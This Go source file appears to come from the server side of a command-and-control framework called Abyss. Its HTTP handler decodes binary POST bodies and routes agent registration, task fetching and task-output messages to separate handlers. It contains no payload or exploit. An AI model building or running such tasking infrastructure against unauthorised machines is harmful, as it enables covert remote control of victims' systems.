package httptransport

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
	"net/http"

	"github.com/z3vxo/Abyss/server/internal/db"
	"github.com/z3vxo/Abyss/server/internal/ws"
)

type AgentServerInfo struct {
	DB *db.DB
	WS *ws.WS
}

const (
	CMD_TYPE_REGISTER = 1
	CMD_GET_TASKS     = 2
	CMD_TASK_OUTPUT   = 3
)

// todo clean up code below

func (srv *AgentServerInfo) HandlePost(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()
	body, err := io.ReadAll(r.Body)
	if err != nil {
		fmt.Println("failed reading body")

		http.Error(w, "", http.StatusNotFound)
		return
	}
	size := len(body)
	reader := bytes.NewReader(body)
	var cmdType int32
	if err := binary.Read(reader, binary.LittleEndian, &cmdType); err != nil {
		fmt.Println(err)
		http.Error(w, "", http.StatusNotFound)
		return
	}

	switch cmdType {
	case CMD_TYPE_REGISTER:
		if err := srv.HandleRegister(reader); err != nil {
			fmt.Println("failed registering")
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		w.WriteHeader(http.StatusOK)
		return

	case CMD_GET_TASKS:
		data, err := srv.HandleGetTasks(reader)
		if err != nil {
			fmt.Println("failed Getting Tasks")
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		w.WriteHeader(http.StatusOK)
		w.Write(data)
		return

	case CMD_TASK_OUTPUT:
		if err := srv.HandleOutput(reader, int32(size)); err != nil {
			fmt.Println("failed handling output")
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		w.WriteHeader(http.StatusOK)
		return

	default:
		http.Error(w, "unknown command type", http.StatusBadRequest)
		return
	}
}
